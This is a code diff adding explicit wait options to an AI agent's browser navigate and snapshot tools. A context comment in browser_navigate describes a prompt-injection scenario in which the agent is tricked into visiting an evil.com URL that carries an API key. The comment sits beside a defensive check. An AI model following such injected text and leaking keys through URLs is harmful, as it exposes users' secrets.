@@ -191,6 +191,23 @@ SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
 # Commands that legitimately return empty stdout (e.g. close, record).
 _EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})
 
+# ---------------------------------------------------------------------------
+# Explicit wait knobs (P2 — Lightpanda pattern-adoption matrix follow-up).
+# Provenance: pattern only, derived from Lightpanda source commit
+# b57798e4a34d385a34da3c37ffab925760255e03 (AGPL-3.0-only). No Lightpanda
+# code is copied; this module wires Hermes' surface to the existing
+# `agent-browser wait` subcommand.
+# ---------------------------------------------------------------------------
+
+# Accepted values for ``wait_until`` — map 1:1 to agent-browser's
+# ``wait --load <state>`` modes.
+_VALID_WAIT_UNTIL: frozenset = frozenset({"load", "domcontentloaded", "networkidle"})
+
+# Floor / ceiling for ``timeout_ms``. Floor avoids pathological 0-timeouts;
+# ceiling caps to 5 min so the agent can't pin a worker indefinitely.
+_WAIT_TIMEOUT_MS_FLOOR = 100
+_WAIT_TIMEOUT_MS_CEILING = 300_000
+
 _cached_command_timeout: Optional[int] = None
 _command_timeout_resolved = False
 
@@ -1470,13 +1487,30 @@ atexit.register(_stop_browser_cleanup_thread)
 BROWSER_TOOL_SCHEMAS = [
     {
         "name": "browser_navigate",
-        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
+        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating. Optional explicit-wait knobs (wait_until / wait_selector / wait_script / timeout_ms) run after navigation but before the auto-snapshot so the returned snapshot reflects the post-wait state.",
         "parameters": {
             "type": "object",
             "properties": {
                 "url": {
                     "type": "string",
                     "description": "The URL to navigate to (e.g., 'https://example.com')"
+                },
+                "wait_until": {
+                    "type": "string",
+                    "enum": ["load", "domcontentloaded", "networkidle"],
+                    "description": "Wait for a page load state after navigation. 'load' waits for the load event; 'domcontentloaded' waits for the DOM (no subresources); 'networkidle' waits for ~500ms of network silence (good for SPAs)."
+                },
+                "wait_selector": {
+                    "type": "string",
+                    "description": "Wait for an element matching this CSS selector (or @ref) to appear in the DOM after navigation. Use this when you know the post-navigation page should contain a specific anchor like '#main-content' or '.results-loaded'."
+                },
+                "wait_script": {
+                    "type": "string",
+                    "description": "Wait until this JavaScript expression evaluates to a truthy value, e.g. 'window.appReady === true' or '!document.body.innerText.includes(\"Loading\")'. Runs in the page context with full DOM access."
+                },
+                "timeout_ms": {
+                    "type": "integer",
+                    "description": "Overall timeout in milliseconds for the navigation and any wait_* conditions. Clamped to [100, 300000]. If omitted, the configured browser.command_timeout is used (default 30s)."
                 }
             },
             "required": ["url"]
@@ -1484,7 +1518,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_snapshot",
-        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
+        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content. Optional explicit-wait knobs (wait_until / wait_selector / wait_script / timeout_ms) run before the snapshot is captured so it reflects the post-wait state.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -1492,6 +1526,23 @@ BROWSER_TOOL_SCHEMAS = [
                     "type": "boolean",
                     "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                     "default": False
+                },
+                "wait_until": {
+                    "type": "string",
+                    "enum": ["load", "domcontentloaded", "networkidle"],
+                    "description": "Wait for a page load state before snapshotting. Useful when an earlier interaction (e.g. browser_click) triggered an XHR/navigation that has not yet settled."
+                },
+                "wait_selector": {
+                    "type": "string",
+                    "description": "Wait for an element matching this CSS selector (or @ref) before snapshotting."
+                },
+                "wait_script": {
+                    "type": "string",
+                    "description": "Wait until this JavaScript expression evaluates to a truthy value before snapshotting."
+                },
+                "timeout_ms": {
+                    "type": "integer",
+                    "description": "Overall timeout in milliseconds for the snapshot and any wait_* conditions. Clamped to [100, 300000]. If omitted, the configured browser.command_timeout is used (default 30s)."
                 }
             },
             "required": []
@@ -1870,6 +1921,117 @@ def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
                 return path
 
     return None
+
+
+def _normalize_wait_knobs(
+    wait_until: Optional[str],
+    wait_selector: Optional[str],
+    wait_script: Optional[str],
+    timeout_ms: Optional[int],
+) -> Tuple[Optional[str], Optional[str], Optional[str], Optional[int], List[str]]:
+    """Normalize and validate the four explicit wait inputs.
+
+    Returns ``(wait_until, wait_selector, wait_script, timeout_ms, errors)``.
+    Invalid values become ``None`` and a description is appended to ``errors``;
+    callers surface the errors as a warning rather than rejecting the call,
+    so a typo in ``wait_until`` never blocks a navigation that would otherwise
+    succeed.
+    """
+    errors: List[str] = []
+
+    if wait_until is not None:
+        v = str(wait_until).strip().lower()
+        if v == "":
+            wait_until = None
+        elif v not in _VALID_WAIT_UNTIL:
+            errors.append(
+                f"wait_until={wait_until!r} not recognized; expected one of "
+                f"{sorted(_VALID_WAIT_UNTIL)}"
+            )
+            wait_until = None
+        else:
+            wait_until = v
+
+    if wait_selector is not None:
+        s = str(wait_selector).strip()
+        wait_selector = s or None
+
+    if wait_script is not None:
+        s = str(wait_script).strip()
+        wait_script = s or None
+
+    if timeout_ms is not None:
+        try:
+            n = int(timeout_ms)
+        except (TypeError, ValueError):
+            errors.append(f"timeout_ms not an integer ({timeout_ms!r})")
+            timeout_ms = None
+        else:
+            if n <= 0:
+                errors.append(f"timeout_ms must be positive (got {timeout_ms!r})")
+                timeout_ms = None
+            else:
+                timeout_ms = max(_WAIT_TIMEOUT_MS_FLOOR, min(n, _WAIT_TIMEOUT_MS_CEILING))
+
+    return wait_until, wait_selector, wait_script, timeout_ms, errors
+
+
+def _wait_timeout_seconds(timeout_ms: Optional[int]) -> Optional[int]:
+    """Convert ``timeout_ms`` to whole seconds for the CLI command timeout.
+
+    Returns ``None`` when ``timeout_ms`` is ``None`` so the caller falls back
+    to the configured default. Rounds up so a 250ms request still gets at
+    least 1s of wall budget at the subprocess layer (the CLI itself receives
+    the millisecond value via the wait subcommand args where applicable).
+    """
+    if timeout_ms is None:
+        return None
+    # Ceil division so sub-second requests don't round to 0.
+    return max(1, -(-int(timeout_ms) // 1000))
+
+
+def _apply_wait_knobs(
+    task_id: str,
+    *,
+    wait_until: Optional[str] = None,
+    wait_selector: Optional[str] = None,
+    wait_script: Optional[str] = None,
+    timeout_seconds: Optional[int] = None,
+) -> Dict[str, Any]:
+    """Issue ``agent-browser wait`` invocations for each requested condition.
+
+    Conditions run in page-lifecycle order — wait_until (load-state) first,
+    then wait_selector (DOM element), then wait_script (custom predicate).
+    Each is a separate ``wait`` invocation on the same task session; the
+    agent-browser CLI exposes only one condition per call. Returns:
+
+      ``{"ok": True, "applied": [...]}``  — every requested wait satisfied.
+      ``{"ok": False, "applied": [...], "failed": <kind>, "error": "..."}``
+        — first failing wait stops the sequence (later conditions are not
+        attempted because they presuppose the earlier ones held).
+    """
+    applied: List[Dict[str, Any]] = []
+    plan: List[Tuple[str, List[str]]] = []
+    if wait_until:
+        plan.append(("wait_until", ["--load", wait_until]))
+    if wait_selector:
+        plan.append(("wait_selector", [wait_selector]))
+    if wait_script:
+        plan.append(("wait_script", ["--fn", wait_script]))
+    if not plan:
+        return {"ok": True, "applied": applied}
+
+    for kind, cli_args in plan:
+        res = _run_browser_command(task_id, "wait", cli_args, timeout=timeout_seconds)
+        if not res.get("success"):
+            return {
+                "ok": False,
+                "applied": applied,
+                "failed": kind,
+                "error": res.get("error", f"wait {kind} failed"),
+            }
+        applied.append({"kind": kind, "args": cli_args})
+    return {"ok": True, "applied": applied}
 
 
 def _run_browser_command(
@@ -2286,17 +2448,37 @@ def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
 # Browser Tool Functions
 # ============================================================================
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+def browser_navigate(
+    url: str,
+    task_id: Optional[str] = None,
+    *,
+    wait_until: Optional[str] = None,
+    wait_selector: Optional[str] = None,
+    wait_script: Optional[str] = None,
+    timeout_ms: Optional[int] = None,
+) -> str:
     """
     Navigate to a URL in the browser.
 
     Args:
         url: The URL to navigate to
         task_id: Task identifier for session isolation
+        wait_until: Optional page load state to wait for after navigation —
+                    one of ``load``, ``domcontentloaded``, ``networkidle``.
+        wait_selector: Optional CSS selector (or @ref) to wait for after
+                       navigation.
+        wait_script: Optional JavaScript expression to wait until truthy.
+        timeout_ms: Optional overall timeout (milliseconds) for the navigation
+                    and any wait_* conditions. Clamped to [100, 300000].
 
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    wait_until, wait_selector, wait_script, timeout_ms, wait_errors = _normalize_wait_knobs(
+        wait_until, wait_selector, wait_script, timeout_ms
+    )
+    has_wait_request = bool(wait_until or wait_selector or wait_script)
+    wait_timeout_s = _wait_timeout_seconds(timeout_ms)
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
@@ -2358,7 +2540,24 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_navigate
-        return camofox_navigate(url, task_id)
+        result_str = camofox_navigate(url, task_id)
+        # Camofox HTTP API does not implement Hermes' explicit-wait surface.
+        # Surface a clear no-op guard so the agent doesn't believe its
+        # wait_* args ran. We attach the guard to the parsed JSON if we can.
+        if has_wait_request or timeout_ms is not None or wait_errors:
+            try:
+                parsed = json.loads(result_str)
+            except Exception:
+                return result_str
+            if has_wait_request or timeout_ms is not None:
+                parsed["wait_unsupported"] = (
+                    "Camofox backend does not implement explicit wait controls; "
+                    "wait_until/wait_selector/wait_script/timeout_ms were ignored."
+                )
+            if wait_errors:
+                parsed["wait_validation_errors"] = wait_errors
+            return json.dumps(parsed, ensure_ascii=False)
+        return result_str
 
     if auto_local_this_nav:
         logger.info(
@@ -2379,7 +2578,13 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         session_info["_first_nav"] = False
         _maybe_start_recording(nav_session_key)
 
-    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))
+    # Honor explicit timeout_ms (when provided) for the navigation itself.
+    # Otherwise keep the historical floor of max(command_timeout, 60s).
+    if wait_timeout_s is not None:
+        open_timeout = wait_timeout_s
+    else:
+        open_timeout = max(_get_command_timeout(), 60)
+    result = _run_browser_command(nav_session_key, "open", [url], timeout=open_timeout)
 
     # Remember which session served this nav so snapshot/click/fill/...
     # on the same task_id hit it (critical when hybrid routing has both a
@@ -2461,10 +2666,36 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                 )
             response["stealth_features"] = active_features
 
+        # Apply explicit wait knobs after navigation succeeds and before the
+        # auto-snapshot so the returned snapshot reflects post-wait state.
+        if has_wait_request:
+            try:
+                wait_result = _apply_wait_knobs(
+                    nav_session_key,
+                    wait_until=wait_until,
+                    wait_selector=wait_selector,
+                    wait_script=wait_script,
+                    timeout_seconds=wait_timeout_s,
+                )
+            except Exception as wait_exc:
+                logger.debug("wait knobs raised after navigate: %s", wait_exc)
+                wait_result = {"ok": False, "applied": [], "failed": "wait", "error": str(wait_exc)}
+            if wait_result.get("applied"):
+                response["wait_applied"] = wait_result["applied"]
+            if not wait_result.get("ok"):
+                response["wait_warning"] = (
+                    f"Explicit wait '{wait_result.get('failed', 'wait')}' "
+                    f"did not satisfy within timeout: {wait_result.get('error', '')}"
+                )
+        if wait_errors:
+            response["wait_validation_errors"] = wait_errors
+
         # Auto-take a compact snapshot so the model can act immediately
         # without a separate browser_snapshot call.
         try:
-            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
+            snap_result = _run_browser_command(
+                nav_session_key, "snapshot", ["-c"], timeout=wait_timeout_s
+            )
             if snap_result.get("success"):
                 snap_data = snap_result.get("data", {})
                 snapshot_text = snap_data.get("snapshot", "")
@@ -2489,7 +2720,12 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 def browser_snapshot(
     full: bool = False,
     task_id: Optional[str] = None,
-    user_task: Optional[str] = None
+    user_task: Optional[str] = None,
+    *,
+    wait_until: Optional[str] = None,
+    wait_selector: Optional[str] = None,
+    wait_script: Optional[str] = None,
+    timeout_ms: Optional[int] = None,
 ) -> str:
     """
     Get a text-based snapshot of the current page's accessibility tree.
@@ -2498,22 +2734,79 @@ def browser_snapshot(
         full: If True, return complete snapshot. If False, return compact view.
         task_id: Task identifier for session isolation
         user_task: The user's current task (for task-aware extraction)
+        wait_until: Optional page load state to wait for before snapshotting.
+        wait_selector: Optional CSS selector (or @ref) to wait for.
+        wait_script: Optional JavaScript expression to wait until truthy.
+        timeout_ms: Optional overall timeout (milliseconds) for the wait_* and
+                    snapshot calls. Clamped to [100, 300000].
 
     Returns:
         JSON string with page snapshot
     """
+    wait_until, wait_selector, wait_script, timeout_ms, wait_errors = _normalize_wait_knobs(
+        wait_until, wait_selector, wait_script, timeout_ms
+    )
+    has_wait_request = bool(wait_until or wait_selector or wait_script)
+    wait_timeout_s = _wait_timeout_seconds(timeout_ms)
+
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_snapshot
-        return camofox_snapshot(full, task_id, user_task)
+        result_str = camofox_snapshot(full, task_id, user_task)
+        if has_wait_request or timeout_ms is not None or wait_errors:
+            try:
+                parsed = json.loads(result_str)
+            except Exception:
+                return result_str
+            if has_wait_request or timeout_ms is not None:
+                parsed["wait_unsupported"] = (
+                    "Camofox backend does not implement explicit wait controls; "
+                    "wait_until/wait_selector/wait_script/timeout_ms were ignored."
+                )
+            if wait_errors:
+                parsed["wait_validation_errors"] = wait_errors
+            return json.dumps(parsed, ensure_ascii=False)
+        return result_str
 
     effective_task_id = _last_session_key(task_id or "default")
+
+    # Apply explicit wait knobs before snapshotting so the snapshot reflects
+    # the post-wait state. Pre-snapshot waits are captured even when the
+    # subsequent snapshot fails — surface them in the failure response too.
+    wait_result: Optional[Dict[str, Any]] = None
+    if has_wait_request:
+        try:
+            wait_result = _apply_wait_knobs(
+                effective_task_id,
+                wait_until=wait_until,
+                wait_selector=wait_selector,
+                wait_script=wait_script,
+                timeout_seconds=wait_timeout_s,
+            )
+        except Exception as wait_exc:
+            logger.debug("wait knobs raised before snapshot: %s", wait_exc)
+            wait_result = {"ok": False, "applied": [], "failed": "wait", "error": str(wait_exc)}
 
     # Build command args based on full flag
     args = []
     if not full:
         args.extend(["-c"])  # Compact mode
 
-    result = _run_browser_command(effective_task_id, "snapshot", args)
+    snap_timeout = wait_timeout_s  # None falls back to default in _run_browser_command
+    result = _run_browser_command(effective_task_id, "snapshot", args, timeout=snap_timeout)
+
+    def _attach_wait_state(resp: Dict[str, Any]) -> Dict[str, Any]:
+        """Stamp wait_applied / wait_warning / wait_validation_errors onto resp."""
+        if wait_result is not None:
+            if wait_result.get("applied"):
+                resp["wait_applied"] = wait_result["applied"]
+            if not wait_result.get("ok"):
+                resp["wait_warning"] = (
+                    f"Explicit wait '{wait_result.get('failed', 'wait')}' "
+                    f"did not satisfy within timeout: {wait_result.get('error', '')}"
+                )
+        if wait_errors:
+            resp["wait_validation_errors"] = wait_errors
+        return resp
 
     if result.get("success"):
         data = result.get("data", {})
@@ -2546,13 +2839,14 @@ def browser_snapshot(
         except Exception as _sv_exc:
             logger.debug("supervisor snapshot merge failed: %s", _sv_exc)
 
-        return json.dumps(response, ensure_ascii=False)
+        return json.dumps(_attach_wait_state(response), ensure_ascii=False)
     else:
         response = {
             "success": False,
             "error": result.get("error", "Failed to get snapshot")
         }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+        _copy_fallback_warning(response, result)
+        return json.dumps(_attach_wait_state(response), ensure_ascii=False)
 
 
 def browser_click(ref: str, task_id: Optional[str] = None) -> str:
@@ -3783,7 +4077,14 @@ registry.register(
     name="browser_navigate",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
-    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_navigate(
+        url=args.get("url", ""),
+        task_id=kw.get("task_id"),
+        wait_until=args.get("wait_until"),
+        wait_selector=args.get("wait_selector"),
+        wait_script=args.get("wait_script"),
+        timeout_ms=args.get("timeout_ms"),
+    ),
     check_fn=check_browser_requirements,
     emoji="🌐",
 )
@@ -3792,7 +4093,14 @@ registry.register(
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
     handler=lambda args, **kw: browser_snapshot(
-        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
+        full=args.get("full", False),
+        task_id=kw.get("task_id"),
+        user_task=kw.get("user_task"),
+        wait_until=args.get("wait_until"),
+        wait_selector=args.get("wait_selector"),
+        wait_script=args.get("wait_script"),
+        timeout_ms=args.get("timeout_ms"),
+    ),
     check_fn=check_browser_requirements,
     emoji="📸",
 )
